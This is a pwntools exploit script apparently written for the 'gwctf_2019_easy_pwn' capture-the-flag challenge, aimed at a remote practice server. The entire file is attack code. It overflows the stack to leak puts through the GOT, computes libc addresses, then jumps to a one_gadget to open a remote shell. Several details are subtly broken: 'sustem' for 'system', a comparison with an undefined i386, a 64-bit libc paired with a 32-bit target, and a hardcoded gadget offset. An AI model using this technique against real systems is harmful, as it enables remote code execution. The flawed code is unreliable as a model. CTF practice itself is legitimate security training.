#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/15 09:37:21
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'i386'
if debug:
    if context.arch == i386:
        sh = process(['./gwctf_2019_easy_pwn'],env={'LD_PRELOAD':'/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so'})
        #sh = process('./')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
    else:
        # sh = process(['./gwctf_2019_easy_pwn'],env={'LD_PRELOAD':'/home/eur1ka/Desktop/Pwn/libc_file/16-32-libc-2.23.so'})
        sh = process('./gwctf_2019_easy_pwn')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        one_offset = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]
else:
    IP = 'node4.buuoj.cn'
    port = 26217
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('gwctf_2019_easy_pwn')
main = 0x08049091
puts_plt = 0x8048DC0
puts_got = 0x804C068
payload = 'I' * 16 + p32(puts_plt) + p32(main) + p32(puts_got)

sh.send(payload)
sh.recvuntil("pretty"*16)
sh.recv(12)
puts_addr = u32(sh.recv(4))
libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('sustem')
binsh_addr = libc_base + libc.dump('str_bin_sh')
one_gadget = libc_base + 0x5f066
payload = 'I' * 16 + p32(one_gadget)
sh.send(payload)
sh.interactive()